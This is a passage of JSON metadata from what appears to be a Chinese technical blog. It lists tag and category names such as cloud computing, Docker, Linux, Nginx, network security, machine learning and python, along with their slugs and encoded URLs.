企业服务","link":"/tags/%E4%BC%81%E4%B8%9A%E6%9C%8D%E5%8A%A1/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"CNN","slug":"CNN","link":"/tags/CNN/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"python","slug":"python","link":"/tags/python/"}],"categories":[{"name":"云计算","slug":"云计算","link":"/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"DBA","slug":"DBA","link":"/categories/DBA/"},{"name":"转载","slug":"转载","link":"/categories/%E8%BD%AC%E8%BD%BD/"},{"name":"Docker","slug":"云计算/Docker","link":"/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/Docker/"},{"name":"Windows","slug":"Windows","link":"/categories/Windows/"},{"name":"操作系统","slug":"操作系统","link":"/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Linux","slug":"转载/Linux","link":"/categories/%E8%BD%AC%E8%BD%BD/Linux/"},{"name":"智能科技","slug":"智能科技","link":"/categories/%E6%99%BA%E8%83%BD%E7%A7%91%E6%8A%80/"},{"name":"大数据","slug":"大数据","link":"/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"测试","slug":"测试","link":"/categories/%E6%B5%8B%E8%AF%95/"},{"name":"阿里云","slug":"云计算/阿里云","link":"/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%98%BF%E9%87%8C%E4%BA%91/"},{"name":"小技巧","slug":"Windows/小技巧","link":"/categories/Windows/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"name":"汇编语言","slug":"操作系统/汇编语言","link":"/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"python","slug":"智能科技/python","link":"/categories/%E6%99%BA%E8%83%BD%E7%A7%91%E6%8A%80/python/"},{"name":"机器学习","slug":"智能科技/机器学习","link":"/categories/%E6%99%BA%E8%83%BD%E7%A7%91%E6%8A%80/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"黑盒测试","slug":"测试/黑盒测试","link":"/categories/%E6%B5%8B%E8%AF%95/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"},{"name":"HCIA","slug":"HCIA","link":"/categories/HCIA/"},{"name":"网络安全","slug":"网络安全","link":"/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"LaTeX","slug":"LaTeX","link":"/categories/LaTeX/"},{"name":"RS","slug":"HCIA/RS","link":"/categories/HCIA/RS/"},{"name":"Nginx","slug":"Nginx","link":"/categories/Nginx/"},{"name":"编程语言","slug":"编程语言","link":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"数据开发","slug":"智能科技/数据开发","link":"/categories/%E6%99%BA%E8%83%BD%E7%A7%91%E6%8A%80/%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/"},{"name":"Linux","slug":"Nginx/Linux","link":"/categories/Nginx/Linux/"},{"name":"shell","slug":"编程语言/shell","link":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/shell/"},{"name":"git","slug":"git","link":"/categories/git/"},{"name":"python","slug":"编程语言/python","link":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/"}]}